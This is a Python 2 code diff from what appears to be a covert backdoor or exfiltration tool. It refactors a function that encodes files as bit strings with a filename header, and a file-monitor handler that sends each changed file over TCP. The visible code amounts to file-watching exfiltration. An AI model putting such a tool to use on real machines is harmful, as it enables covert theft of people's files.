@@ -343,27 +343,23 @@ def messageToBits(message):
 def fileToBits(filePath):
     # fileName = str.split("/")
     print "File path is " + filePath
-    if os.path.isfile(filePath) == True:
-        print "WHAT?"
-        file = open(filePath, "rb")
-        binaryString = ""
+    file = open(filePath, "rb")
+    binaryString = ""
 
-        #convert whatever is in the file into bytes
-        readFile = bytearray(file.read())
-        fileName = filePath.split("/")
-        fileName = fileName[len(fileName) - 1]
-        #craft a header
-        header = messageToBits(fileName + "\n");
+    #convert whatever is in the file into bytes
+    readFile = bytearray(file.read())
+    fileName = filePath.split("/")
+    fileName = fileName[len(fileName) - 1]
+    #craft a header
+    header = messageToBits(fileName + "\n");
 
-        binaryString += header
-        #Check header length
-        #TEST: print("SHOULD BE " + str(len(fileName+"\n")*8) + " IS ACTUALLY : " + str(len(header)))
-        #convert bytes into bits
-        for bit in readFile:
-            binaryString += bin(bit)[2:].zfill(8)
-        return binaryString
-    elif os.path.isdir(filePath) == True:
-        print "NOT FILE"
+    binaryString += header
+    #Check header length
+    #TEST: print("SHOULD BE " + str(len(fileName+"\n")*8) + " IS ACTUALLY : " + str(len(header)))
+    #convert bytes into bits
+    for bit in readFile:
+        binaryString += bin(bit)[2:].zfill(8)
+    return binaryString
 
 
 ##############################################################################################################
@@ -378,7 +374,10 @@ def fileMonitor():
 def change(ev):
     fileName = ev.name
     filePath = ev.pathname
-    sendmessage("TCP", filePath, "file")
+    if os.path.isfile(filePath) == True:
+        sendmessage("TCP", filePath, "file")
+    elif os.path.isdir(filePath) == True:
+        return
 
 if __name__ == "__main__":
     commandSniffProcess = Process(target=sniffing)
